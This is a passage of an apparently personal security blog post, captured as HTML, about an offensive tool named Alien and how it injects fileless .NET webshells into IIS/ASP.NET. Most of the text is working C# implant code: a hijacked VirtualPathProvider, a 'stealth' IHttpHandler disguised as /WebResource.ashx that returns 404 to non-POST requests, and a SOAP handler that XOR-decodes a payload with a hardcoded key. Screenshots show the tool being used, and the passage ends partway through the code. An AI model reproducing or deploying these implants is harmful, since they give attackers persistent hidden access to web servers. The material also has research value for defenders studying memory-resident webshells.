@@ -1,0 +1,417 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Alien] C# In-Memory WebShell | ISSAC/iss4cf0ng's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/Arsenal/"><span class="navItemTitle">Arsenal</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Alien] C# In-Memory WebShell</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-08-29T09:54:59.000Z" id="date"> 2026-08-29</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-09-03T09:55:46.420Z" id="updated"> 2026-09-03</time></div></span><br><span>Word Count: <div class="control">2.3k</div></span><br><span>Read Time: <div class="control">14 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Sicne the version 5.0.0, Alien has supported not only Java memory shell injection, but also .NET-based in-memory web shells.</p>
+<p>In my previous article, I introduced four types of Java memory shells adopted by Alien. In this article, I will introduce four types of Java memory shells adopted by Alien, I will introduce several .NET memory shell techniques implemented by Alien and explain how they interact with the ASP.NET request-process pipeline.</p>
+<p>Unlike Java applications, where memory shells can be attached to components such as <code>Servlet</code>, <code>Filter</code>, <code>Valve</code>, or <code>Interceptor</code>, ASP.NET applications provide a different set of extension points.</p>
+<p>Some of the most interesting ones include:</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Role</th>
+<th>Memory Shell Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>VirtualPathProvider</code></td>
+<td>Virtual resource resolution</td>
+<td>VirtualFile</td>
+</tr>
+<tr>
+<td><code>IHttpHandler</code></td>
+<td>Request endpoint</td>
+<td>Handler</td>
+</tr>
+<tr>
+<td>SOAP / WCF endpoint</td>
+<td>Service-oriented request processing</td>
+<td>SOAP / WCF</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>The common idea behind these techniques is relatively simple:</p>
+<blockquote>
+<p>Instead of modifying a physical web application, the attacker attempts to introduce a new request-processing component into the application process.</p>
+</blockquote>
+<p>Once registered, the component exists inside the application’s runtime and can participate in subsequent HTTP request processing without requiring a corresponding physical source file.</p>
+<p>The following diagram provides a simplified view of where these techniques are positioned in the ASP.NET request-processing architecture.</p>
+<div class="mermaid">
+
+graph TD
+    A["HTTP Request"] --> B["IIS"]
+    B --> C["ASP.NET Application"]
+    C --> D["HttpApplication<br/>Request Pipeline"]
+    D --> F["URL / Resource Resolution"]
+    F --> G["VirtualPathProvider<br/>Virtual Resource"]
+    G --> H["IHttpHandler<br/>Request Endpoint"]
+    D --> I["SOAP / WCF Endpoint"]
+    E --> J["Application Logic"]
+    H --> J
+    I --> J
+
+</div>
+
+<p>The important difference between these techniques is where the malicious component is inserted into the request-processing path.</p>
+<h1 id="Plugin"><a href="#Plugin" class="headerlink" title="Plugin"></a>Plugin</h1><p>The design of the C# memory shell injector is similar to the Java memory shell injector in Alien. Instead of modifying files on disk, the plugin attempts to register runtime components directly inside the ASP.NET application.</p>
+<p>A simplified model of the relationship between the four techniques is shown below:</p>
+<div class="mermaid">
+
+graph TD
+    A["ASP.NET Application"]
+
+    A --> B["VirtualPathProvider"]
+    A --> C["IHttpHandler"]
+    A --> E["SOAP / WCF"]
+
+    B --> B1["Virtual Resource"]
+    C --> C1["Specific Request Endpoint"]
+    E --> E1["Service Endpoint"]
+
+</div>
+
+<p>In a classic ASP.NET application, an incoming HTTP request passes through several stages before reaching the final application component.</p>
+<p><code>HttpApplication</code> represents the ASP.NET application lifecycle and exposes a number of events, including <code>BeginRequest</code>, <code>AuthenticateRequest</code>, and <code>ResolveRequestCache</code>.</p>
+<p>Depending on the requested resource and the application’s configuration, the request may eventually be resolved to a handler or another application component.</p>
+<p>This makes the ASP.NET pipeline particularly interesting from a memory shell perspective.</p>
+<p>Rather than creating a new physical <code>.aspx</code>, <code>.ashx</code>, or <code>.svc</code> file, a runtime component can potentially influence how a request is resolved or processed.</p>
+<p>Alien currently implements four approaches based on different ASP.NET extension points.</p>
+<h2 id="IIS-VirtualFile"><a href="#IIS-VirtualFile" class="headerlink" title="IIS VirtualFile"></a>IIS VirtualFile</h2><p>A <code>VirtualPathProvider</code> can participate in ASP.NET’s virtual-path resolution process and determine whether a requested path exists and how its corresponding resource should be obtained.</p>
+<p>This mechanism was originally designed to allow applications to obtain resources from alternative storage systems or dynamically generated sources. From a security perspective, however, it also provides an interesting location for an in-memory webshell.</p>
+<p>The basic idea is to register a custom <code>VirtualPathProvider</code> and make it recognize a particular virtual path.</p>
+<p>When ASP.NET checks whether the requested resource exists, the provider can indicate that the virtual resource exists even through no corresponding physical file in present.</p>
+<p>Two important methods have to be implemented:</p>
+<ul>
+<li><code>FileExists(String)</code>: Determines whether the requested virtual path exists.</li>
+<li><code>GetFile(String)</code>: Returns a <code>System.Web.Hosting.VirtualFile</code> object representing the requested virtual resource.</li>
+</ul>
+<p>With this mechanism, a <code>VirtualPathProvider</code>-based memory shell can be implemented as follows:</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MyPathProvider</span> : <span class="hljs-title">System.Web.Hosting.VirtualPathProvider</span><br>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> _virtualDir;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> _sourceBase64;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyPathProvider</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> virtualDir, <span class="hljs-built_in">string</span> sourceBase64</span>) : <span class="hljs-title">base</span>()</span><br>    &#123;<br>        _virtualDir = virtualDir;<br>        _sourceBase64 = sourceBase64;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">IsPathVirtual</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> virtualPath</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-built_in">string</span> checkPath = System.Web.VirtualPathUtility.ToAppRelative(virtualPath);<br>            <span class="hljs-keyword">return</span> checkPath.ToLower().Contains(_virtualDir.ToLower());<br>        &#125;<br>        <span class="hljs-keyword">catch</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> virtualPath.ToLower().Contains(_virtualDir.ToLower());<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">FileExists</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> virtualPath</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (IsPathVirtual(virtualPath)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> Previous.FileExists(virtualPath);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> System.Web.Hosting.<span class="hljs-function">VirtualFile <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> virtualPath</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (IsPathVirtual(virtualPath))<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> MyVirtualFile(virtualPath, _sourceBase64);<br>            <br>        <span class="hljs-keyword">return</span> Previous.GetFile(virtualPath);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-built_in">object</span> <span class="hljs-title">InitializeLifetimeService</span>()</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fnGlobalClearCache</span>()</span><br>&#123;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        Type vppRegType = <span class="hljs-keyword">typeof</span>(HostingEnvironment).Assembly.GetType(<span class="hljs-string">&quot;System.Web.Hosting.VirtualPathProviderRegistration&quot;</span>);<br>        <span class="hljs-keyword">if</span> (vppRegType != <span class="hljs-literal">null</span>)<br>        &#123;<br>            MethodInfo clearCache = vppRegType.GetMethod(<span class="hljs-string">&quot;ClearCache&quot;</span>, BindingFlags.Static | BindingFlags.NonPublic);<br>            <span class="hljs-keyword">if</span> (clearCache != <span class="hljs-literal">null</span>) clearCache.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">catch</span> &#123; &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>It is also worth mentioning an interesting and somewhat counterintuitive observation from my experiment.</p>
+<p>After deploying the memory shell, I powered off the VMware virtual machine and left it powered off for several days. When I started the virtual machine again, Alien was still able to communicate with the previously deployed memory shell.</p>
+<p>However, after performing a normal system restart instead, the memory shell became unavailable.</p>
+<p>I suspect that this behavior may be related to how VMWare handles the virtual machine state when it is powered off. In some configuration, a power-off virtual machine may retain or restore a saved state, which could potentially explain why the previous application state appeared to remain available after starting the VM again. A normal system restart, on the other hand, does not preserve the process state in the same way.</p>
+<p>At this point, however, <strong>this is only my hypothesis</strong>. I have not yet determined exactly why the memory shell remained accessible after powering off the VM.</p>
+<p>I found this behavior particularly interesting because, at least from the perspective of my experiment, powering off the virtual machine did not immediately result in the memory shell becoming unavailable. I will investigate this behavior in more detail in a future article and try to determine what is actually happening behind the scenes.</p>
+<p>The injector can then register the <code>VirtualPathProvider</code> and associate it with the selected URL pattern:</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(szUrlPattern))<br>    szUrlPattern = <span class="hljs-string">&quot;/Index.aspx&quot;</span>;<br><span class="hljs-keyword">if</span> (!szUrlPattern.StartsWith(<span class="hljs-string">&quot;/&quot;</span>))<br>    szUrlPattern = <span class="hljs-string">&quot;/&quot;</span> + szUrlPattern;<br><br>MyPathProvider provider = <span class="hljs-keyword">new</span> MyPathProvider(szUrlPattern, szWebShellBase64);<br>HostingEnvironment.RegisterVirtualPathProvider(provider);<br><br>fnGlobalClearCache();<br><br><span class="hljs-keyword">return</span> <span class="hljs-string">$&quot;[+] SUCCESS: IIS VirtualPathProvider MemoryShell injected at [<span class="hljs-subst">&#123;szUrlPattern&#125;</span>]!&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p>Now, let’s try to demonstrate it in Alien.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/1.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/1.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/2.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/2.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/3.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/3.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/4.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/4.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/5.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/5.png" width=700/>
+</p>
+
+<h2 id="IIS-Handler"><a href="#IIS-Handler" class="headerlink" title="IIS Handler"></a>IIS Handler</h2><p>An ASP.NET HTTP Handler (<code>IHttpHandler</code>) is responsible for processing a specific type of web request. When a client requests a resource that is mapped to a particular handler, such as an <code>.aspx</code> or <code>.ashx</code> reosurce, ASP.NET dispatches the request to the corresponding handler.</p>
+<p>An HTTP Handler implements the <code>System.Web.IHttpHandler</code> interface, with <code>ProcessRequest(HttpContext context)</code> serving as its primary entry point. Within <code>ProcessRequest</code>, the handler can access the current <code>HttpContext</code>, inspect HTTP request parameters, access session state, read request data, and write data to the HTTP response.</p>
+<p>From a memory-shell perspective, the interesting part is that a handler instance can be created dynamically and kept in application-level state, while a <code>VirtualPathProvider</code> can be used to associate a virtual path with the corresponding resource.</p>
+<p>In Alien’s implementation, these two mechanisms are combined. The <code>VirtualPathProvider</code> makes the selected virtual path appear to exist even when no physical file is present, while the handler provides the request-processing logic.</p>
+<p>This effectively allows the request to reach an in-memory handler without requiring a corresponding handler file to exist on disk.</p>
+<div class="mermaid">
+
+graph TD
+    A["HTTP Request"] --> B["ASP.NET Virtual Path Resolution"]
+    B --> C["VirtualPathProvider"]
+    C --> D["Virtual Resource"]
+    D --> E["IHttpHandler"]
+    E --> F["ProcessRequest()"]
+    F --> G["HTTP Response"]
+
+</div>
+
+<p>The following implementation demonstrates how Alien keeps the handler state in memory and uses a virtual path provider to expose the corresponding endpoint.</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MyStealthHandler</span> : <span class="hljs-title">IHttpHandler</span>, <span class="hljs-title">System.Web.SessionState.IRequiresSessionState</span><br>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">byte</span>[] _ashxRawBytes;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> IsReusable &#123; <span class="hljs-keyword">get</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; &#125; &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyStealthHandler</span>()</span> &#123; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyStealthHandler</span>(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] ashxRawBytes</span>)</span><br>    &#123;<br>        _ashxRawBytes = ashxRawBytes;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ProcessRequest</span>(<span class="hljs-params">HttpContext ctx</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-keyword">if</span> (!ctx.Request.HttpMethod.Equals(<span class="hljs-string">&quot;POST&quot;</span>, StringComparison.OrdinalIgnoreCase))<br>            &#123;<br>                ctx.Response.StatusCode = <span class="hljs-number">404</span>;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (_ashxRawBytes == <span class="hljs-literal">null</span> || _ashxRawBytes.Length == <span class="hljs-number">0</span>)<br>            &#123;<br>                ctx.Response.StatusCode = <span class="hljs-number">404</span>;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            ctx.Response.ContentType = <span class="hljs-string">&quot;text/html&quot;</span>;<br>            ctx.Response.OutputStream.Write(_ashxRawBytes, <span class="hljs-number">0</span>, _ashxRawBytes.Length);<br>            ctx.Response.Flush();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            ctx.Response.Write(<span class="hljs-string">&quot;HANDLER_EXEC_FAULT: &quot;</span> + ex.Message);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>The corresponding injector can then register the handler instance and expose the selected virtual path through the <code>VirtualPathProvider</code>:</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(szUrlPattern))<br>    szUrlPattern = <span class="hljs-string">&quot;/WebResource.ashx&quot;</span>;<br><span class="hljs-keyword">if</span> (!szUrlPattern.StartsWith(<span class="hljs-string">&quot;/&quot;</span>))<br>    szUrlPattern = <span class="hljs-string">&quot;/&quot;</span> + szUrlPattern;<br><br><span class="hljs-built_in">byte</span>[] rawHandlerCodeBytes = Convert.FromBase64String(szWebShellBase64);<br>MyStealthHandler handlerInstance = <span class="hljs-keyword">new</span> MyStealthHandler(rawHandlerCodeBytes);<br><br><span class="hljs-keyword">lock</span> (currentContext.Application)<br>&#123;<br>    currentContext.Application[<span class="hljs-string">&quot;HANDLER_GATE_&quot;</span> + szUrlPattern.ToLower()] = handlerInstance;<br>&#125;<br><br>MyPathProvider shadowProvider = <span class="hljs-keyword">new</span> MyPathProvider(szUrlPattern, szWebShellBase64);<br>HostingEnvironment.RegisterVirtualPathProvider(shadowProvider);<br>fnGlobalClearCache();<br><br><span class="hljs-keyword">return</span> <span class="hljs-string">$&quot;[+] SUCCESS: IIS HttpHandler dynamically bound and shadows-linked at [<span class="hljs-subst">&#123;szUrlPattern&#125;</span>]!&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p>Now let’s try to demonstrate this technique with Alien.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/6.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/6.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/7.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/7.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/8.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/8.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-8-29-CSharpMemoryShell/9.png'><img src="/images/article/2026-8-29-CSharpMemoryShell/9.png" width=700/>
+</p>
+
+<h2 id="WCF-SOAP"><a href="#WCF-SOAP" class="headerlink" title="WCF / SOAP"></a>WCF / SOAP</h2><p>SOAP (Simple Object Access Protocol) is an XML-based messaging protocol commonly used for communicating with web services. In the .NET ecosystem, SOAP-based services can be exposed through technologies such as ASP.NET ASMX Web Services and WCF.</p>
+<p>An ASMX service is typically associated with an <code>.asmx</code> endpoint, while a WCF service is commonly exposed through a <code>.svc</code> endpoint. When IIS receives a request targeting one of these endpoints, ASP.NET routes then request to the corresponding service implementation, where the SOAP message can then be processed.</p>
+<p>From a memory shell perspective, these service endpoints provide another interesting place to introduce an in-memory request-processing component.</p>
+<p>The basic idea used by Alien is similar to the previous <strong>IIS Handler</strong> technique. Instead of creating a physical <code>.asmx</code> file, Alien registers a virtual pat and associates it with an in-memory handler. The <code>VirtualPathProvider</code> makes the requested endpoint appear to exist even though there is no corresponding physical file on disk.</p>
+<p>The simplified request flow can be described as :</p>
+<div class="mermaid">
+
+graph TD
+    A["HTTP SOAP Request<br/>/PulsarService.asmx"]
+    B["IIS"]
+    C["ASP.NET<br/>Virtual Path Resolution"]
+    D["VirtualPathProvider"]
+    E["In-Memory IHttpHandler"]
+    F["SOAP / Request Processing"]
+
+    A --> B
+    B --> C
+    C --> D
+    D --> E
+    E --> F
+
+</div>
+
+<p>In this implementation, the handler receives the HTTP request through <code>ProcessRequest()</code>. It can access the request body through <code>HttpContext</code>, maintain state through ASP.NET session storage, and process subsequent requests using the object stored in the application session.</p>
+<p>This approach does not require a physical <code>.asmx</code> file to be created on the server. Instead, the endpoint is dynamically represented inside the ASP.NET application’s runtime.</p>
+<p>The following implementation demonstrates the handler used by Alien:</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MyStealthSoapHandler</span> : <span class="hljs-title">IHttpHandler</span>, <span class="hljs-title">System.Web.SessionState.IRequiresSessionState</span><br>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">byte</span>[] _soapRawBytes;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> IsReusable &#123; <span class="hljs-keyword">get</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; &#125; &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyStealthSoapHandler</span>()</span> &#123; &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyStealthSoapHandler</span>(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] soapRawBytes</span>)</span><br>    &#123;<br>        _soapRawBytes = soapRawBytes;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ProcessRequest</span>(<span class="hljs-params">HttpContext ctx</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (ctx.Request.HttpMethod.Equals(<span class="hljs-string">&quot;POST&quot;</span>, StringComparison.OrdinalIgnoreCase))<br>        &#123;<br>            <span class="hljs-keyword">try</span><br>            &#123;<br>                <span class="hljs-built_in">int</span> totalBytes = ctx.Request.TotalBytes;<br>                <span class="hljs-keyword">if</span> (totalBytes &lt;= <span class="hljs-number">4</span>) <span class="hljs-keyword">return</span>;<br>                <span class="hljs-built_in">byte</span>[] rawData = ctx.Request.BinaryRead(totalBytes);<br><br>                <span class="hljs-keyword">if</span> (ctx.Session[<span class="hljs-string">&quot;k&quot;</span>] == <span class="hljs-literal">null</span>) ctx.Session[<span class="hljs-string">&quot;k&quot;</span>] = <span class="hljs-string">&quot;e376d904f308ca98&quot;</span>;<br>                <span class="hljs-built_in">object</span> loader = ctx.Session[<span class="hljs-string">&quot;nebulapulsar&quot;</span>];<br><br>                <span class="hljs-keyword">if</span> (loader == <span class="hljs-literal">null</span>)<br>                &#123;<br>                    <span class="hljs-built_in">byte</span>[] keyBytes = System.Text.Encoding.UTF8.GetBytes((<span class="hljs-built_in">string</span>)ctx.Session[<span class="hljs-string">&quot;k&quot;</span>]);<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; rawData.Length; i++)<br>                        rawData[i] = (<span class="hljs-built_in">byte</span>)(rawData[i] ^ keyBytes[(i + <span class="hljs-number">1</span>) &amp; <span 